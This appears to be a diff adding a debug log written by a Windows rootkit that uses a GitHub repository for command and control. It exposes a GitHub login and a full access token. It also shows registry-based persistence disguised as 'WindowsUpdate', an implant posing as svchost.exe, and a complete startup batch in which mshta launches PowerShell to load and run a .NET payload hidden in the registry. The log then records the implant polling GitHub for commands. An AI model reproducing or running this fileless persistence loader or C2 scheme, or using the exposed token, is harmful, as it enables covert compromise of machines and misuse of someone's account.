@@ -1,0 +1,24 @@
+Sat Sep  4 16:11:02 2021. Initialisation of the log file.
+
+DEBUG: Sat Sep  4 16:11:02 2021: GithubLogin: hidemepls785
+DEBUG: Sat Sep  4 16:11:02 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Sat Sep  4 16:11:02 2021: GihubAccessToken: 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
+DEBUG: Sat Sep  4 16:11:02 2021: Rootkit Name: CorepPreprod3
+DEBUG: Sat Sep  4 16:11:02 2021: Rootkit Registry Key: Sensors
+DEBUG: Sat Sep  4 16:11:02 2021: Run Registry Key Name: WindowsUpdate
+DEBUG: Sat Sep  4 16:11:02 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Sat Sep  4 16:11:03 2021: The folder list for random folder is not empty. Its size is: 2873
+DEBUG: Sat Sep  4 16:11:03 2021: The random path choosed for this execution is: C:\Users\gilles\AppData\Local\Microsoft\OneDrive\21.150.0725.0001\af
+DEBUG: Sat Sep  4 16:11:03 2021: Start of the method createSchTaskCommandLine. 
+DEBUG: Sat Sep  4 16:11:03 2021: This content will be written in the start up batch: @echo off
+mshta "javascript:close(new ActiveXObject('WScript.Shell').run('powershell \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Sensors\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"',0))"
+exit
+DEBUG: Sat Sep  4 16:11:03 2021: The batch for persistence by schtasks is present.
+DEBUG: Sat Sep  4 16:11:03 2021: Start of a new loop to get commands and treat them.
+DEBUG: Sat Sep  4 16:11:03 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Sat Sep  4 16:11:07 2021: Success registering the current rootkitPath, the commands will will requested next time
+ERROR: Sat Sep  4 16:11:07 2021: Fail to get the commands with currentGithubRepoInstance, the current instance is not registered in the github.
+DEBUG: Sat Sep  4 16:11:07 2021: No commands are given in the github repo.
+DEBUG: Sat Sep  4 16:11:07 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Sat Sep  4 16:11:07 2021: This is the end of servant mission.
+DEBUG: Sat Sep  4 16:11:07 2021: Start of GithubCommunication::sendLogs
